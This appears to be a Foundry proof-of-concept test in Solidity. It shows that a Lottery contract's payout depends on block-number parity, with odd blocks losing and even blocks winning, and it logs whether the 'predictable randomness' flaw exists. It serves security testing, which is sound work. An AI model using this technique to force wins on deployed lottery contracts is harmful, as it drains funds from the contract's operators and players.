// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/lottery.sol";

contract LotteryTest is Test {
    Lottery lottery;
    address constant USER = address(0xAA);
    
    function setUp() public {
        lottery = new Lottery();
        vm.deal(address(lottery), 10 ether);
        vm.deal(USER, 1 ether);
    }

    function testPredictableRandomness() public {
        // Set block number to odd (should cause loss)
        vm.roll(1);
        
        // Record pre-state for losing bet
        console2.log("--- BEFORE First Bet (Lose Expected) ---");
        uint256 totalBetsBeforeLoss = lottery.totalBets();
        uint256 totalWinnersBeforeLoss = lottery.totalWinners();
        uint256 userWinsBeforeLoss = lottery.playerWins(USER);
        uint256 contractBalanceBeforeLoss = address(lottery).balance;
        console2.log("TotalBets: %d", totalBetsBeforeLoss);
        console2.log("TotalWinners: %d", totalWinnersBeforeLoss);
        console2.log("USER wins: %d", userWinsBeforeLoss);
        console2.log("Contract balance: %d", contractBalanceBeforeLoss);
        
        // Place first bet (expected loss)
        console2.log("--- TRIGGER First Bet (Block 1 - Expected Loss) ---");
        vm.expectEmit(true, true, false, true, address(lottery));
        emit Lottery.BetPlaced(USER, 0.1 ether, false);
        vm.prank(USER);
        lottery.makeBet{value: 0.1 ether}();
        
        // Record post-state for losing bet
        console2.log("--- AFTER First Bet ---");
        uint256 totalBetsAfterLoss = lottery.totalBets();
        uint256 totalWinnersAfterLoss = lottery.totalWinners();
        uint256 userWinsAfterLoss = lottery.playerWins(USER);
        uint256 contractBalanceAfterLoss = address(lottery).balance;
        console2.log("TotalBets: %d", totalBetsAfterLoss);
        console2.log("TotalWinners: %d", totalWinnersAfterLoss);
        console2.log("USER wins: %d", userWinsAfterLoss);
        console2.log("Contract balance: %d", contractBalanceAfterLoss);
        
        // Validate loss outcomes
        bool lossConditionsMet = (totalBetsAfterLoss == totalBetsBeforeLoss + 1) 
                                && (totalWinnersAfterLoss == totalWinnersBeforeLoss) 
                                && (userWinsAfterLoss == userWinsBeforeLoss)
                                && (contractBalanceAfterLoss == contractBalanceBeforeLoss + 0.1 ether);

        // Set block number to even (should cause win)
        vm.roll(2);
        
        // Record pre-state for winning bet
        console2.log("\n--- BEFORE Second Bet (Win Expected) ---");
        uint256 totalBetsBeforeWin = lottery.totalBets();
        uint256 totalWinnersBeforeWin = lottery.totalWinners();
        uint256 userWinsBeforeWin = lottery.playerWins(USER);
        uint256 contractBalanceBeforeWin = address(lottery).balance;
        console2.log("TotalBets: %d", totalBetsBeforeWin);
        console2.log("TotalWinners: %d", totalWinnersBeforeWin);
        console2.log("USER wins: %d", userWinsBeforeWin);
        console2.log("Contract balance: %d", contractBalanceBeforeWin);
        
        // Place second bet (expected win)
        console2.log("--- TRIGGER Second Bet (Block 2 - Expected Win) ---");
        vm.expectEmit(true, true, false, true, address(lottery));
        emit Lottery.BetPlaced(USER, 0.1 ether, true);
        vm.prank(USER);
        lottery.makeBet{value: 0.1 ether}();
        
        // Record post-state for winning bet
        console2.log("--- AFTER Second Bet ---");
        uint256 totalBetsAfterWin = lottery.totalBets();
        uint256 totalWinnersAfterWin = lottery.totalWinners();
        uint256 userWinsAfterWin = lottery.playerWins(USER);
        uint256 contractBalanceAfterWin = address(lottery).balance;
        console2.log("TotalBets: %d", totalBetsAfterWin);
        console2.log("TotalWinners: %d", totalWinnersAfterWin);
        console2.log("USER wins: %d", userWinsAfterWin);
        console2.log("Contract balance: %d", contractBalanceAfterWin);
        
        // Validate win outcomes
        bool winConditionsMet = (totalBetsAfterWin == totalBetsBeforeWin + 1) 
                                && (totalWinnersAfterWin == totalWinnersBeforeWin + 1) 
                                && (userWinsAfterWin == userWinsBeforeWin + 1)
                                && (contractBalanceAfterWin < contractBalanceBeforeWin + 0.1 ether);

        // Final vulnerability verdict
        bool vulnerabilityExists = lossConditionsMet && winConditionsMet;

        if (vulnerabilityExists) {
            console2.log("Vulnerability Exists: Predictable randomness allows forcing wins by controlling block number");
        } else {
            console2.log("Vulnerability not Exist: State changes did not match predictable pattern");
        }
    }
}